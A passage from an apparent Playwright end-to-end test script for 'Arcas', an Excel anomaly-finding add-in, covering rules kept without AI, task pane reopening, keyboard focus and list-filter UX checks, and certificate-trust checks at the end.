  await page.click("#rules-check"); await idle();
  const lines = await page.$$eval("#rules-list li", (lis) => lis.map((li) => li.textContent));
  ok(since(k0) === "/rules" && lines[0] === "Arcas keeps the 2 rules that held in this workbook and checks them in every scan of this sheet, with no AI.",
    "AH-217: Check subject rules says the rules that held are kept - " + JSON.stringify(lines.slice(0, 2)));
  const saved = await page.evaluate(() => JSON.stringify(__settings.anomalyHunterRules ?? null));
  ok(saved === JSON.stringify({ Ledger: KEPT }), "AH-217: the workbook keeps each rule that held as its kind and headers alone, never a cell or the AI's words - " + saved);
  const s0 = scans.length;
  await find();
  ok(JSON.stringify(scans[s0]?.rules) === JSON.stringify(KEPT) && (await why(11)).includes(RULE) && (await why(21)).includes(RULE),
    "AH-217: Find problems sends the kept rules and lists the rows against them - " + JSON.stringify([await why(11), await why(21)]));
  // pass 1: row 11 is an honest exception, so its check is stopped in its column; row 21 is fixed by hand
  await openRow(11);
  ok((await text("#fix-mute")) === "Never check subject rules in Amount on this sheet", "AH-217: a kept rule's card offers to stop it in its column - " + (await text("#fix-mute")));
  await page.click("#fix-mute"); await idle();
  ok((await text("#notice")).startsWith("Arcas will not check subject rules in Amount on this sheet again."), "AH-217: the foot bar says the rule is stopped - " + (await text("#notice")));
  if (await page.isVisible("#fix-back")) await back();
  const fixed = +(ledger[20][4] * 0.6).toFixed(2);
  await page.evaluate((v) => __edit("Ledger", "F21", v), fixed);
  await page.waitForFunction(() => document.getElementById("notice").textContent.startsWith('Checked F21 on "Ledger"') || document.getElementById("live-note").checkVisibility(), null, { timeout: 8000 }).catch(() => {});
  ok((await text("#notice")) === 'Checked F21 on "Ledger": nothing unusual.' && !(await note()), "AH-217: row 21 fixed by hand is checked against the kept rule and found right - " + (await text("#notice")));
  // pass 2: no AI from here (its route fails, and the stand-in's log must not grow), the pane reloaded
  let asked = 0;
  await page.route("**/rules", (r) => { asked++; return r.abort("connectionrefused"); });
  const log = () => fs.readFileSync(DIR + "ai.log", "utf8").trim().split("\n").length;
  const ai0 = log(), k1 = calls.length, s1 = scans.length;
  await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" }); await profiled();
  const typed = [["INV-1041", 4, 12.5, 0.93, 46.5, 61.5], ["INV-1042", 6, 14.5, 0.92, 105.04, 56.03]]; // Paid over Amount; a fee on top
  await page.evaluate((r) => __paste("Ledger", "A42", [r]), typed[0]);
  await page.waitForFunction(() => document.getElementById("live-note").checkVisibility(), null, { timeout: 8000 }).catch(() => {});
  const said = await note();
  ok(said.startsWith("You changed E42. F42 on Ledger looks wrong: Paid 61.5 is above Amount 46.5: " + RULE),
    "AH-217: after a reload with no AI, a new row against the kept rule is said as you work - " + said);
  if (said) await page.click("#live-close");
  await page.evaluate((r) => __paste("Ledger", "A43", [r]), typed[1]);
  await page.waitForFunction(() => document.getElementById("notice").textContent.startsWith("Checked A43") || document.getElementById("live-note").checkVisibility(), null, { timeout: 8000 }).catch(() => {});
  ok((await text("#notice")).startsWith("Checked A43") && (await text("#notice")).endsWith('on "Ledger": nothing unusual.') && !(await note()),
    "AH-217: a new row like the exception whose rule was stopped is only said checked - " + JSON.stringify([await text("#notice"), await note()]));
  await find();
  ok((await why(42)).includes(RULE) && (await tagOn(43)) === null && (await tagOn(11)) === "Dismissed" && (await tagOn(21)) === null,
    `AH-217: Find problems flags row 42 by the kept rule, row 43 stays quiet, row 11 Dismissed, row 21 fixed - ${await why(42)}, ${await tagOn(43)}, ${await tagOn(11)}, ${await tagOn(21)}`);
  const sent = scans.slice(s1);
  ok(!calls.slice(k1).some(([p]) => p === "/rules") && asked === 0 && log() === ai0 && sent.length >= 3 && sent.every((b) => JSON.stringify(b.rules) === JSON.stringify(KEPT)),
    "AH-217: pass 2 asked neither /rules nor the AI, and every scan (as you work and Find problems) sent the kept rules - " + JSON.stringify({ asked, ai: log() - ai0, scans: sent.length, calls: since(k1) }));
  const grid = await page.evaluate(() => ["F21", "E42", "F42", "E43", "F43", "E11"].map((a) => __cell("Ledger", a)));
  ok(JSON.stringify(grid.map((c) => [c.v, c.f ?? null])) === JSON.stringify([[fixed, null], [46.5, null], [61.5, null], [105.04, null], [56.03, null], [ledger[10][4], null]]),
    "AH-217: Arcas wrote no value and no formula in the sheet: every cell is as typed - " + JSON.stringify(grid));
  { const m = await matchesEngine(); ok(m.ok, "AH-217: the list shows exactly what the engine answered - " + m.why); }
}

// AH-220 (John, 2026-11-25: "runs continuously from open until Excel closes, even with the task pane closed"): with a shared
// runtime a finding brings the closed pane back with its note, once; never for "nothing unusual", with Check as you work
// off, or when the person closes it again soon after (until they open and close it themselves); without SharedRuntime 1.1,
// never, and the fold says so. __pane(false) is the person closing the pane; __shown counts Arcas's showAsTaskpane()
if (mode === "live") {
  const note = () => page.evaluate(() => { const n = document.getElementById("live-note"); return n.checkVisibility() ? n.textContent.replace(/\s+/g, " ").trim() : ""; });
  const waitNote = (has) => page.waitForFunction((has) => document.getElementById("live-note").textContent.includes(has) && !document.getElementById("live-note").hidden, has, { timeout: 8000 }).catch(() => {});
  const pane = () => page.evaluate(() => ({ shown: __shown, open: __open }));
  const typed = async (cell, v) => { await page.evaluate(([c, v]) => __edit("Sales", c, v), [cell, v]); await waitNote(`You changed ${cell}`); };
  if (await note()) await page.click("#live-close");
  await page.$eval("#live-box", (d) => (d.open = true));
  ok((await text("#live-hint")).includes(" It keeps checking after you close this pane, and opens the pane again to tell you. "), "AH-220: the fold says Check as you work goes on with the pane closed - " + (await text("#live-hint")));
  await typed("C201", 88881);
  ok((await note()).startsWith("You changed C201 on Sales.") && JSON.stringify(await pane()) === '{"shown":0,"open":true}', "AH-220: with the pane open, a finding is said and the pane is not asked to open - " + JSON.stringify(await pane()));
  await page.click("#live-close");
  await page.evaluate(() => __pane(false));
  await typed("C202", 88882);
  ok((await note()).startsWith("You changed C202 on Sales.") && JSON.stringify(await pane()) === '{"shown":1,"open":true}', "AH-220: with the pane closed, a finding opens it once, its note showing - " + JSON.stringify({ ...await pane(), note: await note() }));
  await page.click("#live-close");
  await page.evaluate(() => __pane(false)); // closed again at once: left alone
  await typed("C203", 88883);
  ok(JSON.stringify(await pane()) === '{"shown":1,"open":false}', "AH-220: closed again soon after Arcas opened it, the next finding does not open it - " + JSON.stringify(await pane()));
  await page.click("#live-close");
  await page.evaluate(() => { __pane(true); __pane(false); }); // opened and closed by the person: Arcas may open it again
  await page.evaluate(() => __edit("Sales", "B204", __cell("Sales", "B204").v));
  await page.waitForFunction(() => document.getElementById("notice").textContent === 'Checked B204 on "Sales": nothing unusual.', null, { timeout: 8000 }).catch(() => {});
  ok((await text("#notice")) === 'Checked B204 on "Sales": nothing unusual.' && JSON.stringify(await pane()) === '{"shown":1,"open":false}', "AH-220: nothing unusual never opens the pane - " + JSON.stringify({ ...await pane(), notice: await text("#notice") }));
  await page.click("#live");
  await page.evaluate(() => __edit("Sales", "C205", 88885));
  await page.waitForTimeout(3000);
  ok(!(await note()) && JSON.stringify(await pane()) === '{"shown":1,"open":false}', "AH-220: with Check the cells I change off, an edit never opens the pane - " + JSON.stringify(await pane()));
  await page.click("#live");
  await typed("C206", 88886);
  ok((await note()).startsWith("You changed C206 on Sales.") && JSON.stringify(await pane()) === '{"shown":2,"open":true}', "AH-220: after the person opened the pane themselves, a finding opens it again - " + JSON.stringify(await pane()));
  await page.click("#live-close");
  await typed("C208", 88889); // a new burst, the pane still open from that
  ok((await note()).startsWith("You changed C208 on Sales.") && JSON.stringify(await pane()) === '{"shown":2,"open":true}', "AH-220: once Arcas has opened the pane, the next finding is said in it with no new ask - " + JSON.stringify(await pane()));
  await page.click("#live-close");
  // an Excel without SharedRuntime 1.1: the pane's code stops with the pane, as before AH-220, and the fold says so once
  await page.evaluate(() => sessionStorage.setItem("__noShared", "1"));
  await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" }); await profiled();
  const said = await text("#live-hint");
  ok(said.includes(" This Excel checks your edits only while Arcas is open. ") && !said.includes("close this pane"), "AH-220: without SharedRuntime 1.1 the fold says checks run only while Arcas is open - " + said);
  await page.evaluate(() => __pane(false));
  await typed("C207", 88887);
  ok(JSON.stringify(await pane()) === '{"shown":0,"open":false}', "AH-220: without SharedRuntime 1.1 nothing ever asks the pane to open - " + JSON.stringify(await pane()));
  await page.evaluate(() => sessionStorage.removeItem("__noShared"));
}

// AH-228 (the UX study, measured in a browser): the list, the row card and what Arcas learns, on a sheet of their own
// ("UX", the same planted rows) so nothing decided here reaches the steps above
if (mode === "flow2") {
  // fix round 1: more than 10 rows listed, so the kind buttons show: 3 more negative Units (a total each breaks too) and 3
  // more blank Units beside the planted rows
  const ux = rows.map((r) => [...r]);
  for (const [r, v] of [[31, -7], [41, -9], [141, -4], [61, ""], [71, ""], [91, ""]]) ux[r - 1][2] = v;
  await page.evaluate((ux) => { __load("UX", ux, [0]); __activate("UX"); }, ux);
  await page.evaluate(() => { scrollTo(0, 0); document.activeElement?.blur(); });
  // P-04: a scan pressed for lands where its summary is, once, when it would be out of sight (a short pane stands in for
  // text at 200%, where the first row was at 1,418 px)
  await page.setViewportSize({ width: 360, height: 200 });
  await page.focus("#scan"); await page.keyboard.press("Enter"); await idle(); await page.waitForSelector("#results", { state: "visible" });
  await page.waitForFunction(() => document.activeElement !== document.body, null, { timeout: 3000 }).catch(() => {});
  await page.waitForTimeout(900); // a smooth scroll settles
  const landed = await page.evaluate(() => { const r = document.getElementById("summary").getBoundingClientRect(); return { top: Math.round(r.top), bottom: Math.round(r.bottom), h: innerHeight, y: scrollY, focus: document.activeElement.id || document.activeElement.tagName }; });
  ok(landed.y > 0 && landed.top >= 0 && landed.bottom <= landed.h, "AH-228 P-04: a pressed scan brings its summary into view - " + JSON.stringify(landed));
  // P-06: pressed with the keyboard, focus lands on the list's title, never on the page
  ok(landed.focus === "list-title", "AH-228 P-06: after Find problems by keyboard, focus is on the list's title - " + landed.focus);
  await page.evaluate(() => scrollTo(0, 0));
  await openLevel(); await page.focus("#strength"); const y0 = await page.evaluate(() => scrollY); await page.keyboard.press("ArrowRight");
  await page.waitForFunction(() => __state.lastStrength === 6, null, { timeout: 15000 }).catch(() => {}); await idle();
  await page.keyboard.press("ArrowLeft");
  await page.waitForFunction(() => __state.lastStrength === 5, null, { timeout: 15000 }).catch(() => {}); await idle();
  ok((await page.evaluate(() => scrollY)) === y0, "AH-228 P-04: a quiet re-check (the slider) never scrolls the pane");
  await page.$eval("#strength-box", (d) => (d.open = false));
  await page.setViewportSize({ width: 360, height: 900 });
  // P-03: the list is part of the pane's page, never a box that scrolls inside it
  const box = await page.$eval("#flagged-list", (l) => ({ y: getComputedStyle(l).overflowY, inner: l.scrollHeight - l.clientHeight }));
  ok(box.y === "visible" && box.inner <= 1, "AH-228 P-03: the list does not scroll inside the scrolling pane - " + JSON.stringify(box));
  // P-17: the list's hint is short, and what the colours are is said beside Remove highlights
  ok((await text("#list-hint")) === "Worst first. Click a row to see the fix. Check each one before you accept: you know your data best."
    && (await page.isVisible("#highlight-hint")) && (await page.evaluate(() => document.getElementById("clear-highlights").nextElementSibling.id)) === "highlight-hint",
    "AH-228 P-17: the list's hint in 18 words, the colours said beside Remove highlights");
  // P-21: one kind at a time, All to reset; each button 44 px tall
  const kinds = () => page.$$eval("#kind-filter button", (bs) => bs.map((b) => [b.textContent, b.getAttribute("aria-pressed"), b.getBoundingClientRect().height]));
  const all = await kinds(), rowsListed = () => page.$$eval("#flagged-list button", (bs) => bs.map((b) => +/^Row (\d+)/.exec(b.innerText)[1]));
  const every = await rowsListed();
  ok(all.length >= 3 && /^All \d+$/.test(all[0][0]) && +all[0][0].slice(4) > 10 && all[0][1] === "true" && all.every(([, , h]) => h >= 44) && all.some(([t]) => t === "Duplicates 1"),
    "AH-228 P-21: kind buttons over the list of more than 10 rows, All pressed - " + JSON.stringify(all));
  // fix round 1: side by side, each as wide as its words, on 3 lines at most at 360 px
  const lines = await page.$$eval("#kind-filter button", (bs) => new Set(bs.map((b) => Math.round(b.getBoundingClientRect().top))).size);
  ok(lines <= 3, "AH-228 fix round 1: the kind buttons wrap side by side, on at most 3 lines - " + lines);
  await page.click('#kind-filter button:has-text("Duplicates")');
  const dups = await rowsListed();
  ok(dups.length === 1 && dups[0] === 51 && (await page.getAttribute('#kind-filter button:has-text("Duplicates")', "aria-pressed")) === "true"
    && (await page.evaluate(() => document.activeElement.textContent)) === "Duplicates 1", "AH-228 P-21: Duplicates shows row 51 alone, its button pressed and focused - " + dups);
  await page.click('#kind-filter button:has-text("All")');
  ok(JSON.stringify(await rowsListed()) === JSON.stringify(every), "AH-228 P-21: All shows every row again");
  // P-07: a row's keyboard ring is navy, as every other control's (gold-hi is for navy grounds: 2.25:1 on the field)
  await page.focus("#kind-filter button:last-child"); await page.keyboard.press("Tab");
  const ring = await page.evaluate(() => { const b = document.activeElement; return [b.matches("#flagged-list button:focus-visible"), getComputedStyle(b).outlineColor]; });
  ok(ring[0] && ring[1] === "rgb(12, 25, 56)", "AH-228 P-07: a focused row's ring is navy - " + ring);
  await page.evaluate(() => document.activeElement.blur());
  // P-02, P-05, P-16: row 11's fix changes Units, so its stop names the usual range in Units, never totals in Total; the
  // reasons sit under the buttons; after Accept the card says fixed
  await openRow(11);
  const card = await page.evaluate(() => { const y = (id) => document.getElementById(id).getBoundingClientRect();
    return { mute: document.getElementById("fix-mute").textContent, head: document.getElementById("reason-head").textContent, below: y("fix-reason").top > y("fix-apply").bottom }; });
  ok(card.mute === "Never check the usual range in Units on this sheet" && card.head === "Why it was flagged" && card.below,
    "AH-228 P-02, P-05: the stop names the column the fix changes, and the reasons come under Accept - " + JSON.stringify(card));
  await page.click("#fix-apply"); await idle();
  const done = { title: await text("#fix-title"), label: await text("#fix-label"), said: await text("#fix-explanation") };
  ok(done.title === "Row 11: fixed" && done.label === "Accepted fix" && done.said === "Undo puts the old values back.", "AH-228 P-16: an accepted card says fixed - " + JSON.stringify(done));
  await page.click("#fix-undo"); await idle();
  ok((await text("#fix-title")) !== "Row 11: fixed" && (await text("#fix-explanation")) !== "Undo puts the old values back.", "AH-228 P-16: Undo brings back what the card said - " + (await text("#fix-title")));
  await back();
  // P-09, P-39: "east " to "East": the space drawn as a dot a screen reader says, and the column's own word needs no receipt
  await openRow(81);
  const east = await page.evaluate(() => ({ dots: document.querySelectorAll('#fix-changes .old .space[aria-label="space"]').length, said: document.getElementById("fix-explanation").textContent }));
  ok(east.dots === 1 && east.said.endsWith("same word, different capitals/spaces.") && !east.said.includes("Same word as the rest") && !east.said.includes("receipt"), "AH-228 P-09, P-39: " + JSON.stringify(east));
  // P-36: Escape on an open card goes back to the list
  await page.keyboard.press("Escape"); await page.waitForSelector("#results", { state: "visible" }); await idle();
  ok(await page.isVisible("#flagged-list"), "AH-228 P-36: Escape goes back to the list");
  // P-19: a Dismiss says what it taught, with Undo
  await openRow(22); await page.click("#fix-dismiss"); await idle();
  const taughtNote = await text("#notice");
  ok(taughtNote.startsWith("Dismissed. Units 7777 is fine on this sheet from now on.") && (await page.isVisible("#notice-undo")), "AH-228 P-19: " + taughtNote);
  await page.click("#notice-undo"); await idle();
  ok((await page.evaluate(() => __state.decided[20])) === undefined && (await text("#notice")).startsWith("Row 22 is back on your list"), "AH-228 P-19: Undo puts the row back - " + (await text("#notice")));
  // P-01, P-02: a duplicate's stop is the sheet's, said so; its Undo and Check again take it back
  if (await page.isVisible("#fix-view")) await back();
  await openRow(51);
  ok((await text("#fix-mute")) === "Never check duplicates on this sheet", "AH-228 P-02: a duplicate's stop is said as the sheet's - " + (await text("#fix-mute")));
  await page.click("#fix-mute"); await idle();
  const stopped = () => page.$$eval("#stopped-list li", (lis) => lis.map((l) => l.textContent));
  ok((await text("#notice")).startsWith("Arcas will not check duplicates on this sheet again.") && (await page.isVisible("#notice-undo")) && (await stopped()).join() === "Duplicates on UXCheck again",
    "AH-228 P-01: Never check says so with Undo, and lists the stop under Saved in this workbook - " + (await stopped()));
  await page.click("#notice-undo"); await idle();
  ok((await stopped()).length === 0 && (await page.evaluate(() => __state.decided[49])) === undefined, "AH-228 P-01: its Undo checks duplicates again and puts row 51 back");
  if (await page.isVisible("#fix-view")) await back();
  await openRow(51); await page.click("#fix-mute"); await idle();
  await page.$eval("#stopped-list", (l) => (l.closest("details").open = true));
  await page.click('#stopped-list button:has-text("Check again")');
  ok((await stopped()).length === 0 && (await text("#forget-state")) === "Arcas checks duplicates on UX again from the next scan.", "AH-228 P-01: Check again turns the stop off - " + (await text("#forget-state")));
  await page.$eval("#stopped-list", (l) => (l.closest("details").open = false));
  // P-08: a card with no fix offers "I fixed it": nothing changed, it says so; still wrong, it says why; right, it is Fixed
  if (await page.isVisible("#fix-view")) await back();
  await openRow(121);
  ok((await text("#fix-apply")) === "I fixed it" && (await page.isVisible("#fix-apply")) && (await text("#fix-dismiss")) === "Looks right"
    && (await page.$eval("#fix-apply", (b) => b.getBoundingClientRect().height)) >= 44, "AH-228 P-08: a card with no fix offers I fixed it, then Looks right");
  await page.click("#fix-apply"); await idle();
  ok((await text("#fix-status")).startsWith("Row 121 has not changed since the scan."), "AH-228 P-08: nothing changed, it says so - " + (await text("#fix-status")));
  await page.evaluate(() => __edit("UX", "C121", 99999)); await page.click("#fix-apply"); await idle();
  ok((await text("#fix-status")).startsWith("Row 121 still looks wrong: "), "AH-228 P-08: still wrong, the card says why - " + (await text("#fix-status")));
  await page.evaluate((u) => __edit("UX", "C121", u), 40 + ((119 * 7) % 23)); await page.click("#fix-apply"); await idle();
  ok((await page.evaluate(() => __state.decided[119])) === "fixed" && (await text("#notice")).startsWith("Row 121 looks right now."), "AH-228 P-08: right now, the row is Fixed - " + (await text("#notice")));
  if (await page.isVisible("#fix-view")) await back();
  await contrast("AH-228: the list with its kind buttons");
}

// proof for people, at rest: the pointer off every button first (the full-page picture moved the page under it, and a
// hover caught half-way read as a button turned off, AH-149 review r2)
if (process.env.SHOTS) { await page.mouse.move(0, 0); await page.waitForTimeout(400); await page.screenshot({ path: `${process.env.SHOTS}/pane-${mode}.png`, fullPage: true }); }
const real = errors.filter((e) => !(mode === "nokey" && e.includes("status of 400"))); // the junk key gets the engine's 400 on purpose
ok(real.length === 0, "no page errors " + JSON.stringify(real));
ok(unhandled.length === 0, "no unhandled promise rejection or uncaught error on the page in this mode - " + JSON.stringify(unhandled));
// a browser that does not trust the engine's key refuses each new TLS connection once and retries (AH-43). Windows CI's
// Edge gets no pin, and failed a font with ERR_NO_BUFFER_SPACE (PR #121): the engine's own log counts refusals (AH-183)
const LOG = process.env.AH_DATA ? path.join(DATA, "server.log") : DIR + "engine.out";
let log = null; try { log = fs.readFileSync(LOG, "utf8"); } catch {}
if (log === null) console.log(`ok - the browser trusts the engine's certificate: not checked: no engine log at ${LOG}`);
else { const n = log.split("\n").filter((l) => l.includes("CERTIFICATE_UNKNOWN")).length;
  ok(n === 0, `the browser trusts the engine's certificate: no TLS connection refused and retried (AH-43, AH-183) - ${n} refused in ${LOG}`); }
await browser.close();
